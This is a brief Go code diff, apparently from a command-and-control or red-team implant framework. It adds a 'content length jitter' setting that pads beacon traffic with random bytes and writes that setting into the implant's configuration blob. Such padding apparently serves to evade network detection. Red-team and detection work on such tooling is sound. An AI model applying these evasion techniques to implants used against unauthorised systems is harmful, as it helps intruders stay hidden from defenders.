@@ -59,6 +59,8 @@ type agentConfigJSON struct {
 	MalleableRequestPrepend string            `json:"malleable_request_prepend"`
 	MalleableRequestAppend  string            `json:"malleable_request_append"`
 	MalleableRequestHeaders map[string]string `json:"malleable_request_headers"`
+	// Max random bytes appended to the HTTP/WS beacon body (0=disabled).
+	ContentLengthJitter string `json:"content_length_jitter"`
 }
 
 // randomAESKey returns 32 random bytes suitable for AES-256.
@@ -226,6 +228,7 @@ func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 		MalleableRequestPrepend: cfg.MalleableRequestPrepend,
 		MalleableRequestAppend:  cfg.MalleableRequestAppend,
 		MalleableRequestHeaders: cfg.MalleableRequestHeaders,
+		ContentLengthJitter:     fmt.Sprintf("%d", cfg.ContentLengthJitter),
 	}
 	raw, err := json.Marshal(bc)
 	if err != nil {
